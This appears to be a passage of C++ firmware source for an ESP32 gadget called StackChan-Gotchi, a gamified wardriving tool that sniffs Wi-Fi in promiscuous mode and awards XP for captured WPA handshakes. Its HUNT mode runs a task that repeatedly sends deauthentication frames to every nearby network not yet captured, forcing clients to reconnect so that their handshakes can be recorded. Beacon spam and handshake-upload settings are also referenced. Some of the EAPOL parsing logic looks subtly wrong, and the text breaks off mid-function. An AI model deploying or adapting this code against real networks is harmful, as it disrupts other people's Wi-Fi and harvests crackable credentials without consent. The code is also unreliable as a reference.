/*
 * SPDX-FileCopyrightText: 2026 StackChan-Gotchi
 * SPDX-License-Identifier: MIT
 */
#include "gotchi.h"
#include "storage.h"
#include "gps.h"
#include "xp_system.h"
#include "achievement_system.h"
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_log.h>
#include <esp_err.h>
#include <nvs_flash.h>
#include <hal/hal.h>
#include <string.h>
#include <algorithm>
#include <esp_heap_caps.h>
#include <esp_bt.h>
#include <esp_blufi.h>
#include <host/ble_gap.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_http_server.h>
#include <time.h>

static const char* TAG = "gotchi";

namespace gotchi {

static Mode _currentMode = Mode::IDLE;
static Mood _currentMood = Mood::NEUTRAL;
static XPSystem _xpSystem;
static AchievementSystem _achievementSystem;
static bool _initialized = false;
static bool _sniffing = false;
static bool _wifiInitialized = false;
static bool _beaconSpamming = false;
static bool _configModeActive = false;

static uint32_t _startTime = 0;
static uint32_t _networksFound = 0;
static uint32_t _handshakesCaptured = 0;
static uint32_t _channelsScanned = 0;
static uint32_t _lastChannelHop = 0;

// Session tracking
static uint32_t _sessionStartTime = 0;
static uint32_t _sessionStartXP = 0;
static uint32_t _currentChannel = 1;
static int32_t _minHeapSession = 0;

static std::vector<NetworkInfo> _networks;
static std::vector<HandshakeInfo> _handshakes;
static std::vector<BLEDeviceInfo> _bleDevices;
static const int MAX_NETWORKS = 200;

// Configuration
static GotchiConfig _config;
static const int MAX_HANDSHAKES = 50;
static const int MAX_BLE_DEVICES = 100;
static bool _bleScanning = false;

// Handshake state tracking - tracks 4-way handshake progress
struct HandshakeState {
    uint8_t bssid[6];
    uint8_t clientMac[6];
    char ssid[33];
    bool hasM1;  // Has ANonce from AP
    bool hasM2;  // Has SNonce from client  
    bool hasM3;  // Has GTK from AP
    bool hasM4;  // Final confirmation from client
    uint8_t anonce[32];
    uint8_t snonce[32];
    uint8_t mic[16];
    uint32_t lastSeen;
};

static std::vector<HandshakeState> _pendingHandshakes;

static int findPendingHandshake(const uint8_t* bssid, const uint8_t* clientMac) {
    for (int i = 0; i < (int)_pendingHandshakes.size(); i++) {
        if (memcmp(_pendingHandshakes[i].bssid, bssid, 6) == 0) {
            if (clientMac == nullptr || memcmp(_pendingHandshakes[i].clientMac, clientMac, 6) == 0) {
                return i;
            }
        }
    }
    return -1;
}

static void processEapolFrame(uint8_t* payload, int len, const uint8_t* srcMac, const uint8_t* dstMac, 
                              const char* ssid, const uint8_t* bssid, int8_t rssi) {
    // Need at least: LLC (6) + SNAP (6) + EAPOL (4) + Key Info (10) = 26 minimum
    if (len < 26) return;
    
    // Check for LLC+SNAP header: AA:AA:03 (802.1X)
    if (payload[0] != 0xAA || payload[1] != 0xAA || payload[2] != 0x03) return;
    
    // Check for EAPOL (type 0x88, version 0x01)
    if (payload[3] != 0x88 || payload[4] != 0x01) return;
    
    // Skip to EAPOL payload
    uint8_t* eapol = payload + 4;
    
    // Check key descriptor type (0x02 = RSN, 0x01 = WPA)
    if (eapol[1] != 0x02 && eapol[1] != 0x01) return;
    
    // Key descriptor flags: byte eapol[3] and eapol[4]
    uint16_t keyInfo = (eapol[3] << 8) | eapol[4];
    
    // Check if this is a key frame (bit 0 = Key Type)
    bool isKeyFrame = (keyInfo & 0x01) != 0;
    bool hasKeyMic = (keyInfo & 0x100) != 0;    // Key MIC bit
    bool hasKeyData = (keyInfo & 0x200) != 0;    // Key Data bit (PMKID or GTK)
    bool isFromAP = (keyInfo & 0x0400) != 0;     // Install bit - from AP
    
    if (!isKeyFrame) return;
    
    // Key Data Length (bytes 6-7)
    uint16_t keyDataLen = (eapol[6] << 8) | eapol[7];
    if (keyDataLen > len - 8) return;
    
    // Find associated network to get SSID
    char targetSSID[33] = {0};
    if (ssid && strlen(ssid) > 0) {
        strncpy(targetSSID, ssid, 32);
    } else {
        // Look up SSID from BSSID in known networks
        for (const auto& net : _networks) {
            if (memcmp(net.bssid, bssid, 6) == 0) {
                strncpy(targetSSID, net.ssid, 32);
                break;
            }
        }
    }
    
    // Determine message type based on flags
    // M1: From AP, no MIC, has key data (ANonce)
    // M2: From Client, has MIC, no key data (SNonce + MIC)
    // M3: From AP, has MIC, has key data (GTK + MIC)
    // M4: From Client, has MIC, no key data (confirmation)
    
    HandshakeState hs = {};
    memcpy(hs.bssid, bssid, 6);
    memcpy(hs.clientMac, isFromAP ? dstMac : srcMac, 6);  // Client is receiver for M1/M3, sender for M2/M4
    strncpy(hs.ssid, targetSSID, 32);
    hs.lastSeen = GetHAL().millis();
    hs.hasM1 = false;
    hs.hasM2 = false;
    hs.hasM3 = false;
    hs.hasM4 = false;
    
    // Extract key information
    // Key Data starts at offset 8 in EAPOL, after Length (2 bytes)
    uint8_t* keyData = eapol + 8;
    
    // For RSN (WPA2), check for PMKID in Key Data
    // PMKID is at offset 0 in RSN IE when present
    bool hasPMKID = false;
    if (keyDataLen >= 4 && keyData[0] == 0xDD && keyData[1] == 0x16) {
        // Look for PMKID in RSN IE
        for (int i = 0; i < keyDataLen - 8; i++) {
            if (keyData[i] == 0xDD && keyData[i+1] == 0x14) {  // PMKID IE
                hasPMKID = true;
                ESP_LOGI(TAG, "Detected PMKID for %s!", targetSSID);
                break;
            }
        }
    }
    
    // Determine which message we got
    if (!isFromAP && !hasKeyMic && hasKeyData) {
        // This is M1: First message from AP
        hs.hasM1 = true;
        // Extract ANonce from key data
        if (keyDataLen >= 32) {
            memcpy(hs.anonce, keyData + 2, 32);  // Skip RSN IE header
        }
    } else if (isFromAP && hasKeyMic && hasKeyData) {
        // This is M3: Third message from AP (includes GTK)
        hs.hasM3 = true;
        hs.hasM1 = true;  // Must have M1 before M3
    } else if (!isFromAP && hasKeyMic && !hasKeyData) {
        // This is M2 or M4: Client response
        if (hasPMKID) {
            hs.hasM3 = true;  // Treat PMKID as M3
        }
    }
    
    // Find or create pending handshake
    int idx = findPendingHandshake(bssid, hs.clientMac);
    if (idx >= 0) {
        // Update existing
        if (hs.hasM1) _pendingHandshakes[idx].hasM1 = true;
        if (hs.hasM2) _pendingHandshakes[idx].hasM2 = true;
        if (hs.hasM3) _pendingHandshakes[idx].hasM3 = true;
        if (hs.hasM4) _pendingHandshakes[idx].hasM4 = true;
        _pendingHandshakes[idx].lastSeen = GetHAL().millis();
    } else if (_pendingHandshakes.size() < MAX_HANDSHAKES) {
        _pendingHandshakes.push_back(hs);
        idx = _pendingHandshakes.size() - 1;
    }
    
    // Check if handshake is complete (M1+M2 or M1+M3)
    if (_pendingHandshakes[idx].hasM1 && (_pendingHandshakes[idx].hasM2 || _pendingHandshakes[idx].hasM3)) {
        
        // Create final handshake record
        HandshakeInfo finalHs = {};
        strncpy(finalHs.ssid, _pendingHandshakes[idx].ssid, 32);
        memcpy(finalHs.bssid, _pendingHandshakes[idx].bssid, 6);
        memcpy(finalHs.clientMac, _pendingHandshakes[idx].clientMac, 6);
        finalHs.timestamp = GetHAL().millis();
        finalHs.isComplete = true;
        finalHs.messagesGot = 0x07;  // M1+M2+M3 captured
        
        _handshakes.push_back(finalHs);
        _handshakesCaptured++;
        
        // Mark network as having capture
        for (auto& net : _networks) {
            if (memcmp(net.bssid, bssid, 6) == 0) {
                net.hasCapture = true;
                break;
            }
        }
        
        ESP_LOGI(TAG, "🎉 Complete handshake captured for %s!", finalHs.ssid);
        
        // Remove from pending
        _pendingHandshakes.erase(_pendingHandshakes.begin() + idx);
        
        // Bonus XP for capture
        addXP(25);  // Reduced from 50 XP
    }
}

// Forward declaration for header length calculation
static int ieee80211_hdrlen(uint16_t fc);

// WiFi promiscuous packet handler - captures beacon frames and data frames
static void wifiSniffCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (buf == nullptr) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (len < 24) return;

    // Handle management frames (beacons)
    if (type == WIFI_PKT_MGMT) {
        // Check if this is a Beacon frame (subtype 0x80)
        if ((payload[0] & 0xFC) != 0x80) return;

        // Beacon frame - parse SSID from tag 0x00
        int pos = 36;  // Skip fixed parameters
        while (pos < len - 2) {
            uint8_t tag = payload[pos];
            uint8_t tag_len = payload[pos + 1];
            
            if (tag == 0x00) {  // SSID tag
                if (tag_len > 0 && tag_len < 33) {
                    // Found SSID - get BSSID and channel
                    uint8_t bssid[6];
                    memcpy(bssid, &payload[10], 6);
                    int8_t rssi = pkt->rx_ctrl.rssi;
                    uint8_t channel = pkt->rx_ctrl.channel;
                    
                    // Check if already known
                    bool found = false;
                    for (auto& net : _networks) {
                        if (memcmp(net.bssid, bssid, 6) == 0) {
                            net.rssi = rssi;
                            net.lastSeen = GetHAL().millis();
                            found = true;
                            break;
                        }
                    }
                    
                    // Add new network
                    if (!found && _networks.size() < MAX_NETWORKS) {
                        NetworkInfo net;
                        memset(net.ssid, 0, 33);
                        memcpy(net.ssid, &payload[pos + 2], tag_len);
                        memcpy(net.bssid, bssid, 6);
                        net.rssi = rssi;
                        net.channel = channel;
                        net.isHidden = false;
                        net.hasCapture = false;
                        net.lastSeen = GetHAL().millis();
                        _networks.push_back(net);
                        _networksFound++;
                        ESP_LOGI(TAG, "Found: %.32s (ch:%d rssi:%d)", net.ssid, channel, rssi);
                    }
                }
                break;
            }
            pos += tag_len + 2;
        }
    }
    
    // Handle data frames (potential EAPOL handshakes)
    else if (type == WIFI_PKT_DATA) {
        if (len < 24) return;
        
        // Parse frame control to get header length
        uint16_t fc = payload[0] | (payload[1] << 8);
        int hdrlen = ieee80211_hdrlen(fc);
        
        if (len < hdrlen + 8) return;  // Not enough for LLC+EAPOL header
        
        // Check for ToDS/FromDS to adjust for 4-address format
        bool toDs = (fc & 0x0100) != 0;
        bool fromDs = (fc & 0x0200) != 0;
        
        // Adjust offset for 4-address WDS frames
        int offset = hdrlen;
        if (toDs && fromDs) offset += 6;  // WDS frame has 4 addresses
        
        // Check for QoS data frame
        uint8_t subtype = (fc >> 4) & 0x0F;
        bool isQoS = (subtype & 0x08) != 0;
        if (isQoS) offset += 2;
        
        // Check for HTC field (present in QoS frames with Order bit set)
        if (isQoS && (payload[1] & 0x80)) offset += 4;
        
        if (offset + 8 > len) return;
        
        // Check LLC/SNAP header for EAPOL (0xAA 0xAA 0x03 0x00 0x00 0x00 0x88 0x8E)
        if (payload[offset] == 0xAA && payload[offset+1] == 0xAA &&
            payload[offset+2] == 0x03 && payload[offset+3] == 0x00 &&
            payload[offset+4] == 0x00 && payload[offset+5] == 0x00 &&
            payload[offset+6] == 0x88 && payload[offset+7] == 0x8E) {
            
            // Get MACs from 802.11 header
            uint8_t srcMac[6], dstMac[6];
            memcpy(srcMac, &payload[10], 6);  // Transmitter Address (TA)
            memcpy(dstMac, &payload[4], 6);   // Receiver Address (RA)
            
            // BSSID is at offset 16 (Address 3)
            uint8_t bssid[6];
            memcpy(bssid, &payload[16], 6);
            
            // Try to find SSID for the BSSID
            char ssid[33] = {0};
            for (const auto& net : _networks) {
                if (memcmp(net.bssid, bssid, 6) == 0) {
                    strncpy(ssid, net.ssid, 32);
                    break;
                }
            }
            
            processEapolFrame(payload + offset + 8, len - offset - 8, srcMac, dstMac, ssid, bssid, pkt->rx_ctrl.rssi);
        }
    }
}

// Calculate 802.11 header length based on frame control field
static int ieee80211_hdrlen(uint16_t fc) {
    int hdrlen = 24;  // base header
    uint8_t type = (fc >> 2) & 0x3;
    
    if (type == 2) {  // Data frame
        if (fc & 0x0080) hdrlen += 2;  // QoS flag
    }
    if (fc & 0x8000) hdrlen += 4;  // HT control present
    
    return hdrlen;
}

const char* getModeName(Mode mode) {
    switch (mode) {
        case Mode::IDLE: return "IDLE";
        case Mode::SCOUT: return "SCOUT";
        case Mode::HUNT: return "HUNT";
        case Mode::WARDIVE: return "WARDIVE";
        case Mode::SPECTRUM: return "SPECTRUM";
        case Mode::BLE_SCAN: return "BLE-SCAN";
        case Mode::ROGUE: return "ROGUE";
        case Mode::STATS: return "STATS";
        case Mode::CONFIG: return "CONFIG";
        default: return "UNKNOWN";
    }
}

const char* getLevelTitle(int level) {
    return _xpSystem.getLevelTitle();
}

int getXPForLevel(int level) {
    return _xpSystem.getXPForLevel(level);
}

int getXPProgress(int32_t xp, int level) {
    return _xpSystem.getXPProgress();
}

static void loadFromNVS() {
    nvs_handle_t nvs;
    esp_err_t err = nvs_open("gotchi", NVS_READONLY, &nvs);
    if (err != ESP_OK) {
        ESP_LOGI(TAG, "No saved data, starting fresh");
        return;
    }
    
    int32_t savedXP = 0;
    int32_t savedLevel = 1;
    uint32_t savedNetworks = 0;
    
    if (nvs_get_i32(nvs, "xp", &savedXP) == ESP_OK) {
        _xpSystem.addXP(savedXP);
    }
    if (nvs_get_i32(nvs, "level", &savedLevel) == ESP_OK) {
        (void)savedLevel;
    }
    if (nvs_get_u32(nvs, "netsfound", &savedNetworks) == ESP_OK) {
        _networksFound = savedNetworks;
    }
    
    nvs_close(nvs);
    ESP_LOGI(TAG, "Loaded from NVS: XP=%d, Level=%d, Networks=%u", 
        (int)_xpSystem.getXP(), (int)_xpSystem.getLevel(), (unsigned)_networksFound);
    
    _xpSystem.loadFromNVS();
    _achievementSystem.loadFromNVS();
}

static void saveToNVS() {
    nvs_handle_t nvs;
    esp_err_t err = nvs_open("gotchi", NVS_READWRITE, &nvs);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to open NVS for writing");
        return;
    }
    
    nvs_set_i32(nvs, "xp", _xpSystem.getXP());
    nvs_set_i32(nvs, "level", _xpSystem.getLevel());
    nvs_set_u32(nvs, "netsfound", _networksFound);
    nvs_set_u32(nvs, "netscnt", (uint32_t)_networks.size());
    nvs_commit(nvs);
    nvs_close(nvs);
    
    _xpSystem.saveToNVS();
    _achievementSystem.saveToNVS();
    
    ESP_LOGI(TAG, "Saved to NVS: XP=%d, Level=%d, Networks=%u", 
        (int)_xpSystem.getXP(), (int)_xpSystem.getLevel(), (unsigned)_networks.size());
}

void init() {
    if (_initialized) return;

    ESP_LOGI(TAG, "Initializing StackChan-Gotchi...");

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_LOGW(TAG, "NVS flash needs recovery, erasing...");
        esp_err_t erase_ret = nvs_flash_erase();
        if (erase_ret != ESP_OK) {
            ESP_LOGE(TAG, "NVS erase failed: %d", erase_ret);
        }
        ret = nvs_flash_init();
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "NVS init after erase failed: %d", ret);
        }
    } else if (ret != ESP_OK) {
        ESP_LOGE(TAG, "NVS flash init failed: %d", ret);
    }

    // Load saved XP/level from NVS
    loadFromNVS();
    
    // Initialize XP and Achievement systems
    _xpSystem.init();
    _achievementSystem.init();

    // Initialize GPS
    getGpsManager().init();

    // Initialize storage and load config
    if (initStorage()) {
        if (loadConfig(_config)) {
            ESP_LOGI(TAG, "Config loaded from SD card");
            if (_config.wigleApiKey[0] != '\0') {
                ESP_LOGI(TAG, "WiGLE API key configured");
            }
            if (_config.wpasecKey[0] != '\0') {
                ESP_LOGI(TAG, "WPA-sec API key configured");
            }
        }
        // Save default config if not exists
        saveConfig(_config);
    }

    // Initialize BLE system for scanning capability
    // This ensures NimBLE host is started before we attempt any BLE operations
    ESP_LOGI(TAG, "Ensuring BLE system is ready...");
    GetHAL().startBleServer();  // This initializes NimBLE as peripheral
    // Brief delay to allow BLE to initialize
    vTaskDelay(pdMS_TO_TICKS(100));

    _currentMode = Mode::IDLE;
    _currentMood = Mood::NEUTRAL;
    _startTime = GetHAL().millis();
    _initialized = true;

    ESP_LOGI(TAG, "StackChan-Gotchi initialized");
}

void update() {
    if (!_initialized) return;

    // Update GPS data
    getGpsManager().update();

    uint32_t now = GetHAL().millis();
    uint32_t uptime = (now - _startTime) / 1000;

    // Channel hopping - prioritize primary channels 1, 6, 11 for better coverage
    if (_sniffing && (now - _lastChannelHop) > 200) {
        static uint8_t hopIndex = 0;
        // Primary channels get more dwell time, secondary channels scanned less
        static const uint8_t channelSequence[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
        hopIndex = (hopIndex + 1) % 13;
        _currentChannel = channelSequence[hopIndex];
        esp_wifi_set_channel(_currentChannel, WIFI_SECOND_CHAN_NONE);
        _channelsScanned++;
        _lastChannelHop = now;
    }

// Passive XP gain (reduced rate - every 30 seconds)
    if (uptime % 3000 == 0 && uptime > 0) {
        addXP(1);
    }
    
    // Bonus XP for networks found (every 60 seconds, but reduced gain)
    if (_networksFound > 0 && (now % 60000) < 100) {
        addXP(1);  // 1 XP per minute regardless of network count
    }
}

static TaskHandle_t _deauthTaskHandle = nullptr;
static bool _deauthActive = false;

static void sendDeauthFrame(const uint8_t* bssid, uint8_t reason) {
    uint8_t deauth[32];
    memset(deauth, 0, sizeof(deauth));
    
    deauth[0] = 0xC0;
    deauth[1] = 0x00;
    deauth[2] = 0x00;
    deauth[3] = 0x00;
    memcpy(&deauth[4], bssid, 6);
    memcpy(&deauth[10], bssid, 6);
    memcpy(&deauth[16], bssid, 6);
    deauth[22] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauth, 23, false);
}

static void deauthTask(void* param) {
    (void)param;
    ESP_LOGI(TAG, "Deauth task started");
    
    uint32_t lastDeauth = 0;
    uint32_t deauthCount = 0;
    
    while (_deauthActive && _currentMode == Mode::HUNT) {
        uint32_t now = GetHAL().millis();
        
        if (now - lastDeauth > 3000) {
            lastDeauth = now;
            
            const uint8_t DISASSOC_REASON = 0x03;
            
            for (const auto& net : _networks) {
                if (!_deauthActive || _currentMode != Mode::HUNT) break;
                if (net.hasCapture) continue;
                if (net.channel != _currentChannel) continue;
                
                sendDeauthFrame(net.bssid, DISASSOC_REASON);
                deauthCount++;
                
                vTaskDelay(pdMS_TO_TICKS(50));
                
                if (deauthCount >= 5) break;
            }
            
            if (deauthCount % 30 == 0 && deauthCount > 0) {
                ESP_LOGI(TAG, "Deauth frames sent: %u", deauthCount);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    
    ESP_LOGI(TAG, "Deauth task stopped, sent %u frames", deauthCount);
    _deauthActive = false;
    vTaskDelete(NULL);
}

static void startDeauth() {
    if (_deauthActive) return;
    if (_currentMode != Mode::HUNT) return;
    
    ESP_LOGI(TAG, "Starting deauth for handshake capture");
    _deauthActive = true;
    xTaskCreate(deauthTask, "deauth_task", 2048, NULL, 3, &_deauthTaskHandle);
}

static void stopDeauth() {
    if (!_deauthActive) return;
    
    _deauthActive = false;
    
    if (_deauthTaskHandle) {
        vTaskDelay(pdMS_TO_TICKS(100));
        _deauthTaskHandle = nullptr;
    }
    
    ESP_LOGI(TAG, "Deauth attack stopped");
}

void shutdown() {
    if (!_initialized) return;

    stopSniff();
    stopScout();
    
    // Save XP/level before shutdown
    saveToNVS();
    
    _initialized = false;
    _wifiInitialized = false;

    ESP_LOGI(TAG, "StackChan-Gotchi shutdown");
}

void setMode(Mode mode) {
    if (_currentMode == mode) return;

    bool wasSniffing = _sniffing;
    _currentMode = mode;

    // Stop any previous WiFi/BLE activity
    if (wasSniffing) {
        stopSniff();
        stopScout();
    }
    if (_bleScanning) {
        stopBLEScan();
    }
    if (_beaconSpamming) {
        stopRogue();
    }
    if (_configModeActive) {
        stopConfigMode();
    }
    if (_deauthActive) {
        stopDeauth();
    }

    // Start appropriate mode
    switch (mode) {
        case Mode::HUNT:
            ESP_LOGI(TAG, "Starting HUNT mode (promiscuous + deauth)");
            _sessionStartTime = GetHAL().millis();
            _sessionStartXP = _xpSystem.getXP();
            startSniff();
            startDeauth();
            break;
        case Mode::SCOUT:
            ESP_LOGI(TAG, "Starting SCOUT mode (active scan)");
            _sessionStartTime = GetHAL().millis();
            _sessionStartXP = _xpSystem.getXP();
            startScout();
            break;
        case Mode::WARDIVE:
            ESP_LOGI(TAG, "Starting WARDIVE mode (passive)");
            _sessionStartTime = GetHAL().millis();
            _sessionStartXP = _xpSystem.getXP();
            startSniff();
            break;
        case Mode::SPECTRUM:
            ESP_LOGI(TAG, "Starting SPECTRUM mode (passive)");
            _sessionStartTime = GetHAL().millis();
            _sessionStartXP = _xpSystem.getXP();
            startSniff();
            break;
        case Mode::BLE_SCAN:
            ESP_LOGI(TAG, "Starting BLE-SCAN mode (BLE scan)");
            _sessionStartTime = GetHAL().millis();
            _sessionStartXP = _xpSystem.getXP();
            startBLEScan();
            break;
        case Mode::ROGUE:
            ESP_LOGI(TAG, "Starting ROGUE mode (beacon spam)");
            _sessionStartTime = GetHAL().millis();
            _sessionStartXP = _xpSystem.getXP();
            startRogue();
            break;
        case Mode::CONFIG:
            ESP_LOGI(TAG, "Starting CONFIG mode (web server)");
            _sessionStartTime = GetHAL().millis();
            _sessionStartXP = _xpSystem.getXP();
            startConfigMode();
            break;
        case Mode::IDLE:
            ESP_LOGI(TAG, "IDLE mode");
            break;
        default:
            break;
    }

    switch (mode) {
        case Mode::HUNT:
            _currentMood = Mood::FOCUSED;
            break;
        case Mode::SCOUT:
            _currentMood = Mood::NEUTRAL;
            break;
        case Mode::WARDIVE:
            _currentMood = Mood::EXCITED;
            break;
        case Mode::SPECTRUM:
            _currentMood = Mood::FOCUSED;
            break;
        case Mode::BLE_SCAN:
            _currentMood = Mood::FOCUSED;
            break;
        case Mode::ROGUE:
            _currentMood = Mood::EXCITED;
            break;
        case Mode::CONFIG:
            _currentMood = Mood::HAPPY;
            break;
        default:
            _currentMood = Mood::HAPPY;
            break;
    }
}

Mode getCurrentMode() {
    return _currentMode;
}

void setMood(Mood mood) {
    _currentMood = mood;
}

Mood getCurrentMood() {
    return _currentMood;
}

Stats getStats() {
    Stats stats;
    stats.xp = _xpSystem.getXP();
    stats.level = _xpSystem.getLevel();
    stats.networksFound = _networksFound;
    stats.handshakesCaptured = _handshakesCaptured;
    stats.channelsScanned = _channelsScanned;
    stats.uptimeSeconds = (GetHAL().millis() - _startTime) / 1000;
    
    // Session statistics
    stats.sessionNetworks = _networks.size();
    stats.sessionTimeSeconds = (GetHAL().millis() - _sessionStartTime) / 1000;
    stats.sessionStartTime = _sessionStartTime;
    stats.sessionXPGain = _xpSystem.getXP() - _sessionStartXP;
    stats.currentChannel = _currentChannel;
    
    // Heap monitoring
    stats.freeHeap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
    if (_minHeapSession == 0 || stats.freeHeap < _minHeapSession) {
        _minHeapSession = stats.freeHeap;
    }
    stats.minHeap = _minHeapSession;
    
    // GPS data
    GPSData gps = getGpsManager().getData();
    stats.gpsValid = gps.valid;
    stats.gpsSatellites = gps.satellites;
    stats.gpsLat = gps.latitude;
    stats.gpsLon = gps.longitude;
    
    return stats;
}

GotchiConfig getConfig() {
    return _config;
}

void addXP(int32_t amount) {
    if (!_initialized) return;
    if (amount <= 0) return;
    
    // Apply mode-specific multipliers to XP
    float multiplier = 1.0f;
    switch (_currentMode) {
        case Mode::WARDIVE:
            multiplier = 1.5f;
            break;
        case Mode::SPECTRUM:
            multiplier = 1.2f;
            break;
        case Mode::SCOUT:
            multiplier = 0.8f;
            break;
        case Mode::IDLE:
            multiplier = 0.0f;
            break;
        default:
            multiplier = 1.0f;
            break;
    }
    
int32_t effectiveAmount = (int32_t)(amount * multiplier);
    _xpSystem.addXP(effectiveAmount);
}

std::vector<NetworkInfo> getNetworks() {
    return _networks;
}

int getNetworkCount() {
    return (int)_networks.size();
}

void startSniff() {
    if (_sniffing) return;

    // Only initialize WiFi once - don't reinit on every mode change
    if (!_wifiInitialized) {
        ESP_LOGI(TAG, "Initializing WiFi (one-time)");
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_err_t ret = esp_wifi_init(&cfg);
        if (ret != ESP_OK) {
            ESP_LOGW(TAG, "WiFi init failed: %d", ret);
            return;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
        
        ret = esp_wifi_set_mode(WIFI_MODE_STA);
        if (ret != ESP_OK) {
            ESP_LOGW(TAG, "WiFi mode set failed: %d", ret);
            esp_wifi_deinit();
            return;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
        
        _wifiInitialized = true;
    } else {
        ESP_LOGI(TAG, "Reusing existing WiFi");
    }

    esp_err_t ret = esp_wifi_disconnect();
    (void)ret;
    vTaskDelay(pdMS_TO_TICKS(100));

    // Register packet capture callback
    esp_wifi_set_promiscuous_rx_cb(wifiSniffCallback);

    // Enable both management and data frame capture for handshake detection
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    ret = esp_wifi_set_promiscuous_filter(&filter);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Set filter failed: %d", ret);
    }
    ret = esp_wifi_set_promiscuous(true);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "Promiscuous mode error (non-fatal): %d", ret);
        esp_wifi_set_promiscuous(false);
        wifi_scan_config_t scan_config = {};
        scan_config.show_hidden = true;
        esp_wifi_scan_start(&scan_config, false);
    }
    vTaskDelay(pdMS_TO_TICKS(100));

    // Start on channel 1 and initialize channel hopping
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    _lastChannelHop = GetHAL().millis();

    _sniffing = true;
    ESP_LOGI(TAG, "Sniff mode started");
}

void stopSniff() {
    if (!_sniffing) return;

    esp_wifi_set_promiscuous(false);
    _sniffing = false;
    ESP_LOGI(TAG, "Sniff mode stopped");
}

void startScout() {
    if (_sniffing) return;

    // Reuse WiFi if already initialized
    if (!_wifiInitialized) {
        ESP_LOGI(TAG, "Initializing WiFi for Scout (one-time)");
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_err_t ret = esp_wifi_init(&cfg);
        if (ret != ESP_OK) {
            ESP_LOGW(TAG, "WiFi init failed: %d", ret);
            return;
        }
        vTaskDelay(pdMS_TO_TICKS(50));

        ret = esp_wifi_set_mode(WIFI_MODE_STA);
        if (ret != ESP_OK) {
            ESP_LOGW(TAG, "WiFi mode set failed: %d", ret);
            esp_wifi_deinit();
            return;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
        
        _wifiInitialized = true;
    }

    wifi_scan_config_t scan_config = {};
    scan_config.show_hidden = true;
    esp_wifi_scan_start(&scan_config, false);

    _sniffing = true;
    ESP_LOGI(TAG, "Scout mode started");
}

void stopScout() {
    if (!_sniffing) return;

    esp_wifi_scan_stop();
    _sniffing = false;
    ESP_LOGI(TAG, "Scout mode stopped");
}

bool isSniffing() {
    return _sniffing;
}

std::vector<ChannelInfo> getChannelAnalysis() {
    std::vector<ChannelInfo> channelInfo(14);
    
    for (int i = 0; i < 14; i++) {
        channelInfo[i].channel = i + 1;
        channelInfo[i].networkCount = 0;
        channelInfo[i].maxRssi = -100;
        channelInfo[i].avgRssi = -100;
    }
    
    int channelSum[14] = {0};
    int channelCount[14] = {0};
    
    for (const auto& net : _networks) {
        if (net.channel >= 1 && net.channel <= 14) {
            int idx = net.channel - 1;
            channelInfo[idx].networkCount++;
            channelSum[idx] += net.rssi;
            channelCount[idx]++;
            if (net.rssi > channelInfo[idx].maxRssi) {
                channelInfo[idx].maxRssi = net.rssi;
            }
        }
    }
    
    for (int i = 0; i < 14; i++) {
        if (channelCount[i] > 0) {
            channelInfo[i].avgRssi = channelSum[i] / channelCount[i];
        }
    }
    
    return channelInfo;
}

void addHandshake(const HandshakeInfo& hs) {
    if (_handshakes.size() >= MAX_HANDSHAKES) {
        _handshakes.erase(_handshakes.begin());
    }
    _handshakes.push_back(hs);
}

std::vector<HandshakeInfo> getHandshakes() {
    return _handshakes;
}

int getHandshakeCount() {
    int count = 0;
    for (const auto& hs : _handshakes) {
        if (hs.isComplete) count++;
    }
    return count;
}

bool hasCompleteHandshake(const uint8_t* bssid) {
    for (const auto& hs : _handshakes) {
        if (hs.isComplete && memcmp(hs.bssid, bssid, 6) == 0) {
            return true;
        }
    }
    return false;
}

std::vector<BLEDeviceInfo> getBLEDevices() {
    return _bleDevices;
}

int getBLEDeviceCount() {
    return (int)_bleDevices.size();
}

static int bleScanCb(struct ble_gap_event* event, void* arg) {
    if (event->type == BLE_GAP_EVENT_DISC) {
        const struct ble_gap_disc_desc* desc = &event->disc;
        
        BLEDeviceInfo device = {};
        memcpy(device.mac, desc->addr.val, 6);
        device.rssi = desc->rssi;
        device.advType = desc->event_type;
        device.lastSeen = GetHAL().millis();
        
        bool hasName = false;
        for (int i = 0; i < desc->length_data; i++) {
            if (desc->data[i] == 0x09 || desc->data[i] == 0x08) {
                int nameLen = desc->data[i + 1];
                if (nameLen > 32) nameLen = 32;
                memcpy(device.name, &desc->data[i + 2], nameLen);
                device.name[nameLen] = '\0';
                hasName = true;
                break;
            }
        }
        
        if (!hasName) {
            snprintf(device.name, 33, "Unknown_%02X%02X", device.mac[4], device.mac[5]);
        }
        
        for (auto& dev : _bleDevices) {
            if (memcmp(dev.mac, device.mac, 6) == 0) {
                dev.rssi = device.rssi;
                dev.lastSeen = device.lastSeen;
                if (hasName && device.name[0] != '\0') {
                    strncpy(dev.name, device.name, 32);
                }
                return 0;
            }
        }
        
        if (_bleDevices.size() < MAX_BLE_DEVICES) {
            _bleDevices.push_back(device);
            ESP_LOGI(TAG, "BLE: %s RSSI:%d", device.name, device.rssi);
        }
    }
    return 0;
}

void startBLEScan() {
    if (_bleScanning) return;
    
    ESP_LOGI(TAG, "Starting BLE scan...");
    
    struct ble_gap_disc_params discParams = {
        .itvl = 0x0010,
        .window = 0x0010,
